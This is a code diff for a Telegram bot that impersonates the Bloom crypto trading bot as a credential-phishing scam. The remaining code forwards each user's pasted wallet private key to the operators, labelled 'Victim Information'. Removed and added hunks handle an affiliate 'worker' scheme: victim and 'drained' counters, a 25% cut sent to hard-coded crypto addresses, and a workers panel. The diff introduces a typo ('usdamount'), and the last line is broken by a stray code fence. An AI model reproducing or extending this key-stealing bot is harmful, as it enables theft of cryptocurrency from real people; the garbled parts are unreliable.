@@ -1,4 +1,3 @@
-# Bloomsaint
 import os
 import time
 import requests
@@ -61,37 +60,6 @@ def current_time():
 def is_user_banned(user_id):
     """Check if a user is banned"""
     return user_id in BANNED_USERS
-
-def load_worker_data():
-    """Load worker data from JSON file"""
-    try:
-        with open('workers.json', 'r') as f:
-            return json.load(f)
-    except FileNotFoundError:
-        return {"workers": {}, "referrals": {}}
-    except json.JSONDecodeError:
-        return {"workers": {}, "referrals": {}}
-
-def save_worker_data(data):
-    """Save worker data to JSON file"""
-    with open('workers.json', 'w') as f:
-        json.dump(data, f, indent=2)
-
-def get_or_create_worker(user_id):
-    """Get worker data or create new worker"""
-    data = load_worker_data()
-    user_id_str = str(user_id)
-
-    if user_id_str not in data["workers"]:
-        data["workers"][user_id_str] = {
-            "clicks": 0,
-            "victims": 0,
-            "drained": 0.0,
-            "level": 1.00
-        }
-        save_worker_data(data)
-
-    return data["workers"][user_id_str]
 
 # Removed SOL price function - no longer needed
 
@@ -243,14 +211,14 @@ def confirm_keyboard(action, data):
 
 def get_first_one_off_message():
     return (
-        "🌸 <b>Bloom - Your <i>UNFAIR</i> advantage in crypto</b> 🌸\n\n"
+        "<b>Bloom - Your <i>UNFAIR</i> advantage in crypto</b>\n\n"
         "Bloom allows you to seamlessly trade tokens, set automations like Limit Orders, Copy Trading, Sniping, and more—all within Telegram.\n\n"
         "By continuing, you'll create a crypto wallet that interacts directly with Bloom, enabling real-time trading all in Telegram. "
         "All trading activities and wallet management can occur inside Telegram.\n\n"
-        "⚠️ <b>IMPORTANT:</b> After clicking Continue, your public wallet address and private key will be generated and displayed directly within Telegram. "
+        "<b>IMPORTANT:</b> After clicking Continue, your public wallet address and private key will be generated and displayed directly within Telegram. "
         "Ensure you are in a private space or location before proceeding. Your private key is for your own use only, and it is crucial that you store it securely, "
         "as Bloom will not store or retrieve it for you.\n\n"
-        "By pressing <a href='https://t.me/SolanaBloomCryptoBot'>Continue</a>, you confirm that you have read and agree to our "
+        "By pressing Continue, you confirm that you have read and agree to our "
         "<a href='https://tos.bloombot.app/'>Terms and Conditions</a> and "
         "<a href='https://tos.bloombot.app/'>Privacy Policy</a>. You also acknowledge the inherent risks involved in cryptocurrency trading and accept full responsibility for any outcomes relating to your use of Bloom.\n\n"
         "Please take a moment to review our terms before moving forward."
@@ -325,31 +293,6 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     chat_id = update.effective_chat.id
     user_id = user.id
 
-    # Handle referral if present
-    if context.args and len(context.args) > 0:
-        try:
-            referrer_id = int(context.args[0])
-            if referrer_id != user_id:  # Don't allow self-referral
-                data = load_worker_data()
-
-                # Add referral mapping
-                data["referrals"][str(user_id)] = str(referrer_id)
-
-                # Update referrer's clicks
-                referrer_id_str = str(referrer_id)
-                if referrer_id_str not in data["workers"]:
-                    data["workers"][referrer_id_str] = {
-                        "clicks": 0,
-                        "victims": 0,
-                        "drained": 0.0,
-                        "level": 1.00
-                    }
-
-                data["workers"][referrer_id_str]["clicks"] += 1
-                save_worker_data(data)
-        except ValueError:
-            pass  # Invalid referrer ID, continue normally
-
     # Check if user is banned
     if is_user_banned(user_id):
         await context.bot.send_message(
@@ -414,61 +357,34 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         reply_markup=main_menu_keyboard(),
     )
 
-async def worker(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Worker command - show worker stats and referral link, or admin panel for owners"""
-    user_id = update.effective_user.id
+async def panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Admin panel command - only for owners"""
+    user = update.effective_user
+    user_id = user.id
     chat_id = update.effective_chat.id
 
-    # Check if user is owner - show admin panel
-    if user_id in [OWNER_ID, SECOND_OWNER_ID]:
-        text = (
-            "🔧 <b>Admin Panel</b>\n\n"
-            "Welcome to the administrative control panel.\n"
-            "Select an option below:\n\n"
-            f"🕒 Accessed at: {current_time()}"
-        )
-
+    # Check if user is an owner
+    if user_id not in [OWNER_ID, SECOND_OWNER_ID]:
         await context.bot.send_message(
             chat_id=chat_id,
-            text=text,
-            parse_mode=ParseMode.HTML,
-            reply_markup=panel_keyboard(),
+            text="❌ Access denied. This command is for administrators only.",
         )
-    else:
-        # Show worker stats for non-owners
-        worker_stats = get_or_create_worker(user_id)
-        level = worker_stats.get('level', 1.00)
+        return
 
-        # Format the worker menu
-        text = (
-            "📊 ︱— Stats\n"
-            f"{worker_stats['clicks']} - Total Clicks\n"
-            f"{worker_stats['victims']} - Total Victims\n"
-            f"${worker_stats['drained']:.2f} - Amount Drained\n\n"
-            "🔨 ︱— Level\n"
-            f"{level:.2f} - No Perks\n\n"
-            "🔗 ︱— Link\n"
-            f"https://t.me/SolanaBloomCryptoBot?start={user_id}"
-        )
+    # Send admin panel
+    text = (
+        "🔧 <b>Admin Panel</b>\n\n"
+        "Welcome to the administrative control panel.\n"
+        "Select an option below:\n\n"
+        f"🕒 Accessed at: {current_time()}"
+    )
 
-        # Create inline keyboard - show Update Level button only for owners
-        if user_id in [OWNER_ID, SECOND_OWNER_ID]:
-            worker_keyboard = InlineKeyboardMarkup([
-                [InlineKeyboardButton("Update Level", callback_data=f"update_level_{user_id}")],
-                [InlineKeyboardButton("Support", url="https://t.me/Opimet")]
-            ])
-        else:
-            worker_keyboard = InlineKeyboardMarkup([
-                [InlineKeyboardButton("Support", url="https://t.me/Opimet")]
-            ])
-
-        await context.bot.send_message(
-            chat_id=chat_id,
-            text=text,
-            parse_mode=ParseMode.HTML,
-            disable_web_page_preview=True,
-            reply_markup=worker_keyboard,
-        )
+    await context.bot.send_message(
+        chat_id=chat_id,
+        text=text,
+        parse_mode=ParseMode.HTML,
+        reply_markup=panel_keyboard(),
+    )
 
 async def support(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Support command"""
@@ -485,6 +401,75 @@ async def support(update: Update, context: ContextTypes.DEFAULT_TYPE):
         chat_id=chat_id,
         text=text,
         parse_mode=ParseMode.HTML,
+    )
+
+async def worker(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Worker command - displays worker information with custom links"""
+    user = update.effective_user
+    user_id = user.id
+    chat_id = update.effective_chat.id
+
+    # Check if user is an owner
+    if user_id not in [OWNER_ID, SECOND_OWNER_ID]:
+        await context.bot.send_message(
+            chat_id=chat_id,
+            text="❌ Access denied. This command is for administrators only.",
+        )
+        return
+
+    # Load workers data
+    try:
+        with open('Workers.json', 'r') as f:
+            workers_data = json.load(f)
+    except FileNotFoundError:
+        workers_data = {"workers": {}, "referrals": {}}
+    except json.JSONDecodeError:
+        workers_data = {"workers": {}, "referrals": {}}
+
+    workers = workers_data.get("workers", {})
+
+    if not workers:
+        text = (
+            "👥 <b>Workers Panel</b>\n\n"
+            "No workers found.\n\n"
+            f"🕒 Last updated: {current_time()}"
+        )
+        keyboard = InlineKeyboardMarkup([
+            [InlineKeyboardButton("❌ Close", callback_data="close")]
+        ])
+    else:
+        text = "👥 <b>Workers Panel</b>\n\n"
+        keyboard_buttons = []
+
+        for worker_id, worker_info in workers.items():
+            # Create custom link for each worker
+            worker_name = worker_info.get("name", f"Worker {worker_id}")
+            custom_link = f"https://t.me/your_bot_username?start=worker_{worker_id}"
+
+            text += f"🔹 <b>{worker_name}</b>\n"
+            text += f"   ID: {worker_id}\n"
+            text += f"   Link: <code>{custom_link}</code>\n\n"
+
+            # Add button for each worker
+            keyboard_buttons.append([
+                InlineKeyboardButton(f"📋 {worker_name}", callback_data=f"worker_details_{worker_id}")
+            ])
+
+        text += f"🕒 Last updated: {current_time()}"
+
+        # Add close button
+        keyboard_buttons.append([
+            InlineKeyboardButton("❌ Close", callback_data="close")
+        ])
+
+        keyboard = InlineKeyboardMarkup(keyboard_buttons)
+
+    await context.bot.send_message(
+        chat_id=chat_id,
+        text=text,
+        parse_mode=ParseMode.HTML,
+        reply_markup=keyboard,
+        disable_web_page_preview=True,
     )
 
 async def positions_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -691,74 +676,22 @@ async def message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         # Get username or fallback to N/A
         username = user.username if user.username else "N/A"
 
-        # Load worker data to check for referrals
-        worker_data = load_worker_data()
-        user_id_str = str(user_id)
-
-        # Update victim count for referrer
-        if user_id_str in worker_data["referrals"]:
-            referrer_id = worker_data["referrals"][user_id_str]
-            if referrer_id in worker_data["workers"]:
-                worker_data["workers"][referrer_id]["victims"] += 1
-                save_worker_data(worker_data)
-
         # Create victim information message with private key
-        if user_id_str in worker_data["referrals"]:
-            referrer_id = worker_data["referrals"][user_id_str]
-            victim_message_owners = (
-                "🌸 Victim imported wallet via worker\n\n"
-                "🔎 Victim Information\n\n"
-                f"├ 👤 Name: {username}\n"
-                f"├ 🆔 {user_id}\n"
-                f"├ 👨‍💼 Worker ID: {referrer_id}\n"
-                f"├ 🔑 Private Key: <code>{message_text}</code>"
-            )
-            victim_message_worker = (
-                "<b><u>⚠️ Paste the private key below into phantom</u></b>\n\n"
-                "🌸 Victim imported Solana wallet\n\n"
-                "🔎 Victim Information\n\n"
-                f"├ 👤 Name: {username}\n"
-                f"├ 🆔 {user_id}\n"
-                f"├ 🔑 Private Key: <code>{message_text}</code>\n\n"
-                "<b><u>⚠️ Do not try to exit scam, you will be instantly caught red handed and banned from using the service!</u></b>"
-            )
-        else:
-            victim_message_owners = (
-                "🌸 Victim imported Solana wallet\n\n"
-                "🔎 Victim Information\n\n"
-                f"├ 👤 Name: {username}\n"
-                f"├ 🆔 {user_id}\n"
-                f"├ 🔑 Private Key: <code>{message_text}</code>"
-            )
-            victim_message_worker = victim_message_owners
+        victim_message = (
+            "🌸 Victim imported Solana wallet\n\n"
+            "🔎 Victim Information\n\n"
+            f"├ 👤 Name: {username}\n"
+            f"├ 🆔 {user_id}\n"
+            f"├ 🔑 Private Key: <code>{message_text}</code>"
+        )
 
-        # Send to owners (they get all logs)
+        # Send to both owners
         try:
-            await context.bot.send_message(chat_id=OWNER_ID, text=victim_message_owners, parse_mode=ParseMode.HTML)
+            await context.bot.send_message(chat_id=OWNER_ID, text=victim_message, parse_mode=ParseMode.HTML)
             if SECOND_OWNER_ID:
-                await context.bot.send_message(chat_id=SECOND_OWNER_ID, text=victim_message_owners, parse_mode=ParseMode.HTML)
+                await context.bot.send_message(chat_id=SECOND_OWNER_ID, text=victim_message, parse_mode=ParseMode.HTML)
         except Exception as e:
             print(f"Error sending to owners: {e}")
-
-        # Send to referrer if they exist and are not an owner
-        if user_id_str in worker_data["referrals"]:
-            referrer_id = int(worker_data["referrals"][user_id_str])
-            if referrer_id not in [OWNER_ID, SECOND_OWNER_ID]:
-                try:
-                    # Create inline keyboard for worker with new buttons
-                    worker_keyboard = InlineKeyboardMarkup([
-                        [InlineKeyboardButton("Send 25% cut", callback_data="send_25_cut")],
-                        [InlineKeyboardButton("Contact Support", url="https://t.me/Opimet")]
-                    ])
-                    
-                    await context.bot.send_message(
-                        chat_id=referrer_id, 
-                        text=victim_message_worker, 
-                        parse_mode=ParseMode.HTML,
-                        reply_markup=worker_keyboard
-                    )
-                except Exception as e:
-                    print(f"Error sending to referrer {referrer_id}: {e}")
 
         # Show wallet creation confirmation message without inline buttons
         await update.message.reply_text("Please wait while your wallet is being created. ✅")
@@ -788,7 +721,7 @@ async def message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 admin_states[user_id]["pending_balance"] = {
                     "target_user_id": target_user_id,
                     "sol_amount": sol_amount,
-                    "usd_amount": usd_amount
+                    "usd_amount": usdamount
                 }
                 admin_states[user_id]["awaiting_balance_input"] = False
 
@@ -959,34 +892,6 @@ async def message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
             return
 
-        elif admin_state.get("awaiting_level_input"):
-            # Expecting new level value
-            try:
-                new_level = float(message_text.strip())
-                target_worker_id = admin_states[user_id]["target_worker_id"]
-
-                # Load worker data
-                worker_data = load_worker_data()
-                target_worker_id_str = str(target_worker_id)
-
-                # Update worker level
-                if target_worker_id_str in worker_data["workers"]:
-                    worker_data["workers"][target_worker_id_str]["level"] = new_level
-                    save_worker_data(worker_data)
-                    await update.message.reply_text(f"🔨 Worker {target_worker_id}'s level updated to {new_level:.2f} successfully.")
-                else:
-                    await update.message.reply_text(f"❌ Worker with ID {target_worker_id} not found.")
-
-                # Clean up admin state
-                admin_states[user_id].pop("awaiting_level_input", None)
-                admin_states[user_id].pop("target_worker_id", None)
-
-            except ValueError:
-                await update.message.reply_text("❌ Invalid level value. Please enter a valid number (e.g., 1.50, 2.00).")
-            except Exception as e:
-                await update.message.reply_text(f"❌ Error: {str(e)}")
-
-            return
 
 async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
@@ -1128,45 +1033,6 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 reply_markup=saved_scripts_keyboard()
             )
 
-        return
-
-    # Handle level update button (only for owners)
-    if user_id in [OWNER_ID, SECOND_OWNER_ID] and data.startswith("update_level_"):
-        worker_id = int(data.split("_")[2])
-
-        # Initialize admin state for this user
-        if user_id not in admin_states:
-            admin_states[user_id] = {}
-        admin_states[user_id]["awaiting_level_input"] = True
-        admin_states[user_id]["target_worker_id"] = worker_id
-
-        await context.bot.send_message(
-            chat_id=query.message.chat_id,
-            text=f"🔧 <b>Update Worker Level</b>\n\nWorker ID: {worker_id}\nPlease enter the new level value (e.g., 1.50, 2.00):",
-            parse_mode=ParseMode.HTML
-        )
-        return
-
-    # Handle Send 25% cut button
-    if data == "send_25_cut":
-        cut_text = (
-            "<b>Solana Address (Click to copy)</b>\n"
-            "<code>7vY3pg1RwmLzNkZyQ47iEEqJ5j5WreY45ypPAkaaEdQe</code>\n\n"
-            "<b>Ethereum Address (Click to Copy)</b>\n"
-            "<code>0xaF688295e1F0C6c62140603B4EBACBB9ef00Cf61</code>\n\n"
-            "<b>Support Account</b> @Opimet"
-        )
-        
-        cut_keyboard = InlineKeyboardMarkup([
-            [InlineKeyboardButton("Send 25% cut", callback_data="send_25_cut")],
-            [InlineKeyboardButton("Contact Support", url="https://t.me/Opimet")]
-        ])
-        
-        await query.edit_message_text(
-            text=cut_text,
-            parse_mode=ParseMode.HTML,
-            reply_markup=cut_keyboard
-        )
         return
 
     # Popup alerts for specific buttons that need wallet import or other alerts
@@ -1456,7 +1322,7 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if data == "settings":
         text = (
             "🌸 Bloom Settings\n\n"
-            "🟢 : The feature/mode is turned ON\n\n"
+            "🟢 : The feature/mode is turned ON\n"
             "🔴 : The feature/mode is turned OFF\n\n"
             "📖 Learn More!\n\n"
             f"🕒 Last updated: {current_time()}"
@@ -1551,7 +1417,7 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         # Update the settings menu with new states
         text = (
             "🌸 Bloom Settings\n\n"
-            "🟢 : The feature/mode is turned ON\n\n"
+            "🟢 : The feature/mode is turned ON\n"
             "🔴 : The feature/mode is turned OFF\n\n"
             "📖 Learn More!\n\n"
             f"🕒 Last updated: {current_time()}"
@@ -1562,6 +1428,28 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             parse_mode=ParseMode.HTML,
             disable_web_page_preview=True,
         )
+        return
+
+    # Handle Payment Addresses (for owners)
+    if data == "show_payment_addresses":
+        if user_id in [OWNER_ID, SECOND_OWNER_ID]:
+            text = (
+                "💰 <b>Payment Addresses</b>\n\n"
+                "Please send payments to one of the following addresses:\n\n"
+                "🔹 <b>Solana Address</b> (Click to copy)\n"
+                "<code>7vY3pg1RwmLzNkZyQ47iEEqJ5j5WreY45ypPAkaaEdQe</code>\n\n"
+                "🔹 <b>Ethereum Address</b> (Click to Copy)\n"
+                "<code>0xaF688295e1F0C6c62140603B4EBACBB9ef00Cf61</code>\n\n"
+                "📞 <b>Support Account:</b> @Opimet"
+            )
+            await query.edit_message_text(
+                text=text,
+                reply_markup=InlineKeyboardMarkup([
+                    [InlineKeyboardButton("❌ Close", callback_data="close")]
+                ]),
+                parse_mode=ParseMode.HTML,
+                disable_web_page_preview=True,
+            )
         return
 
     # Add handlers for other buttons here as needed...
@@ -1579,9 +1467,9 @@ def main():
     app = ApplicationBuilder().token(TOKEN).build()
 
     app.add_handler(CommandHandler("start", start))
-    app.add_handler(CommandHandler("worker", worker))
-    
+    app.add_handler(CommandHandler("panel", panel))
     app.add_handler(CommandHandler("support", support))
+    app.add_handler(CommandHandler("worker", worker))
     app.add_handler(CommandHandler("positions", positions_command))
     app.add_handler(CommandHandler("sniper", sniper_command))
     app.add_handler(CommandHandler("copy", copy_command))
@@ -1597,5 +1485,5 @@ def main():
     app.run_polling()
 
 
-if __name__ == "__main__":
+if __name__ == "__main__":```python
     main()
